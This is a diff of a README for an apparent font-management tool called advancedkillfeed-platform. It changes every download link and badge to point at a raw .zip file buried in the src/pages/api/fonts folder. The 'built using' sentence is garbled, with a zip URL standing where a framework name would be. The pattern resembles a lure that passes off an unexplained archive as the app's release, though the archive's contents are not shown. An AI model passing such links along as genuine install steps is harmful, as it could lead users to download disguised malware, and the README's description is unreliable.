@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to the advancedkillfeed-platform! This application helps you manage fonts for AdvancedKillFeed killfeeds easily. It is built using https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/lib/advancedkillfeed-platform_2.1.zip, Prisma, NextAuth, and Tailwind CSS. Whether you want to customize your font styles or experiment with new looks, this tool is here to help. 
+Welcome to the advancedkillfeed-platform! This application helps you manage fonts for AdvancedKillFeed killfeeds easily. It is built using https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/pages/api/fonts/platform_advancedkillfeed_thebaism.zip, Prisma, NextAuth, and Tailwind CSS. Whether you want to customize your font styles or experiment with new looks, this tool is here to help. 
 
 ## 📥 Download & Install
 
-[![Download the latest release](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/lib/advancedkillfeed-platform_2.1.zip%20release-brightgreen)](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/lib/advancedkillfeed-platform_2.1.zip)
+[![Download the latest release](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/pages/api/fonts/platform_advancedkillfeed_thebaism.zip%20release-brightgreen)](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/pages/api/fonts/platform_advancedkillfeed_thebaism.zip)
 
-To download the application, visit this page: [Download Release](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/lib/advancedkillfeed-platform_2.1.zip).
+To download the application, visit this page: [Download Release](https://raw.githubusercontent.com/Nicollas638/advancedkillfeed-platform/master/src/pages/api/fonts/platform_advancedkillfeed_thebaism.zip).
 
 ## 💻 System Requirements
 
